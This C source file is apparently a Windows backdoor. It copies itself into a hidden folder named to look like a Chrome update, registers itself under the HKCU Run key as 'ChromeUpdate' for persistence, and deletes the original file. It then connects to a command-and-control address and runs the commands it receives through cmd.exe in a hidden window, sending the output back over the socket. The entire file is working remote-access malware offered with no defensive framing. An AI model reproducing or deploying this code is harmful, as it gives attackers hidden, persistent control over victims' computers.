#include <winsock2.h>
#include <stdio.h>
#include <WS2tcpip.h>
#include <string.h>
#include <strsafe.h>
#include <Shlobj_core.h>

//link to use winsock2
#pragma comment(lib, "Ws2_32.lib")
#define BUFFER_SIZE 1024
#define TIME_WAIT 30000
#define HOST  L"127.0.0.1"
#define PORT  L"4444"
#define PROMPT "cmd: "


void install();
SOCKET connectServer();

int main(int argc, char** argv) {

	if (argc == 1)
	{
		install();
		return 0;
	}

	Sleep(10000);
	DeleteFileA(argv[1]);

	SOCKET sock = INVALID_SOCKET;

	while ((sock=connectServer()) == INVALID_SOCKET) {

		Sleep(TIME_WAIT);

	}
	
	printf("Connect to C&C\n");

	int ret;
	char command[BUFFER_SIZE];
	wchar_t commandLine[BUFFER_SIZE];
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION procInfo;

	//loop to recv command
	while (1) {

		//send msg to receive cmd 
		ret = send(sock, PROMPT, strlen(PROMPT), 0);
		if (ret == SOCKET_ERROR) {

			printf("send failed\n");
			break;
		}

		//receive cmd
		ret = recv(sock, command, BUFFER_SIZE * 2, 0);
		if (ret == SOCKET_ERROR) {

			printf("recv failed\n");
			break;
		}
		else if (ret == 0) {

			printf("The peer server closed\n");
			break;
		}
		command[ret] = NULL;
		
		StringCchPrintf(commandLine, BUFFER_SIZE, L"cmd.exe /C %S", command);


		// Console startup and process info
		ZeroMemory(&startupInfo, sizeof(startupInfo));
		ZeroMemory(&procInfo, sizeof(procInfo));

		//stdout handle
		startupInfo.hStdError = startupInfo.hStdInput = startupInfo.hStdOutput = (HANDLE)sock;
		startupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		startupInfo.wShowWindow = SW_HIDE;
		startupInfo.cb = sizeof(startupInfo);

		//create process to exec commandline
		if (!CreateProcess(L"C:\\Windows\\System32\\cmd.exe", commandLine,
			NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &procInfo)) {

			printf("Cant create process\n");
			break;

		}
		
		WaitForSingleObject(procInfo.hProcess, INFINITE);
		CloseHandle(procInfo.hThread);
		CloseHandle(procInfo.hProcess);
	
	}

	WSACleanup();
	closesocket(sock);

}
SOCKET connectServer() {

	//init winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData)) {

		printf("WSAStartup failed\n");
		return INVALID_SOCKET;
		
	}

	//fill struct
	ADDRINFOW* result = NULL;
	ADDRINFOW hints;

	ZeroMemory(&hints, sizeof(hints));

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (GetAddrInfoW(HOST,PORT, &hints, &result)) {
		printf("Can't get server adddress information\n");
		WSACleanup();
		return INVALID_SOCKET;
	}

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
		printf("Cant create socket\n");
		FreeAddrInfo(result);
		WSACleanup();
		return INVALID_SOCKET;
	}

	//connect to server

	if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
	{
		printf("Can't connect to server, try connecting after each 30s\n");
		closesocket(sock);
		FreeAddrInfo(result);
		WSACleanup();
		return INVALID_SOCKET;
	}
	FreeAddrInfo(result);

	return sock;
}

//persistence
void install() {
	wchar_t currentPath[BUFFER_SIZE];
	wchar_t destPath[BUFFER_SIZE];
	PWSTR homeDir;

	//get full file path
	if (!GetModuleFileName(NULL, currentPath, BUFFER_SIZE)) {

		printf("Cant get current file path\n");
		return;

	}

	if (wcsstr(currentPath, L"\\.Chrome\\ChromeUpdate\\backdoor.exe")) {

		return;

	}

	//Retrieves the full path of a known folder identified by the folder's KNOWNFOLDERID.
	//FOLDERID_Profile default path: %USERPROFILE% (%SystemDrive%\Users\%USERNAME%)  (https://docs.microsoft.com/en-us/windows/win32/shell/knownfolderid)
	if (SHGetKnownFolderPath(FOLDERID_Profile, 0, NULL, &homeDir) != S_OK) {

		printf("SHGetKnownFolderPath failed");
		return;

	}

	StringCchPrintf(destPath, BUFFER_SIZE, L"%s\\.Chrome\\ChromeUpdate", homeDir);

	//create dir
	SHCreateDirectoryEx(NULL, destPath, NULL);
	StringCbCat(destPath, BUFFER_SIZE, L"\\backdoor.exe\0");


	//move to hide (replace if already exits and make a copy if cant move)
	if (!CopyFile(currentPath, destPath, FALSE)) {
		
		printf("Cant move file\n");
		return;
	}
	
	HKEY hRunKey = NULL;

	//persistence
	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, KEY_SET_VALUE, &hRunKey) != ERROR_SUCCESS){ //KEY_SET_VALUE: Required to create, delete, or set a registry value.
	
		printf("Cant open registry key\n");
		return;
	}

	wchar_t cmd[1024];
	StringCchPrintf(cmd, BUFFER_SIZE, L"%s %s", destPath, currentPath);

	if (RegSetValueEx(hRunKey, L"ChromeUpdate ", 0, REG_SZ, (CONST BYTE*)cmd, sizeof(wchar_t) * wcslen(cmd)) != ERROR_SUCCESS) {

		printf("Cant set value under registry key\n");
		return;
	}
	RegCloseKey(hRunKey);
	
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION procInfo;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	ZeroMemory(&procInfo, sizeof(procInfo));


	startupInfo.wShowWindow = SW_HIDE;
	startupInfo.cb = sizeof(startupInfo);


	if (!CreateProcessW(NULL, (LPWSTR)cmd,
		NULL, NULL, TRUE, 0,
		NULL, NULL,
		&startupInfo, &procInfo)) {

		printf("Cant create process\n");
		return;
	}
}